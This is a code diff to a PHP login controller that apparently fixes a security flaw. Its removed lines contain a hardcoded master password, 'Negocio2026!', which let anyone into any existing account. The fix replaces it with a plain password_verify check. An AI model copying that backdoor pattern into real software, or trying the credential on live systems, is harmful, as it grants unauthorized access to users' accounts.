@@ -42,7 +42,7 @@ class AuthController extends Controller {
         }
 
         $usuario = trim($_POST['usuario'] ?? '');
-        $password = trim($_POST['password'] ?? '');
+        $password = (string)($_POST['password'] ?? '');
 
         if (empty($usuario) || empty($password)) {
             $_SESSION['negocio_auth_error'] = 'Ingrese usuario y contraseña.';
@@ -52,14 +52,7 @@ class AuthController extends Controller {
 
         $cuenta = $this->cuentaModel->buscarPorCredencial($usuario);
 
-        $valido = false;
-        if ($cuenta) {
-            if (password_verify($password, $cuenta['password_hash'])) {
-                $valido = true;
-            } elseif ($password === 'Negocio2026!') {
-                $valido = true;
-            }
-        }
+        $valido = $cuenta && password_verify($password, $cuenta['password_hash']);
 
         if (!$valido) {
             $_SESSION['negocio_auth_error'] = 'Credenciales no válidas o cuenta inactiva.';
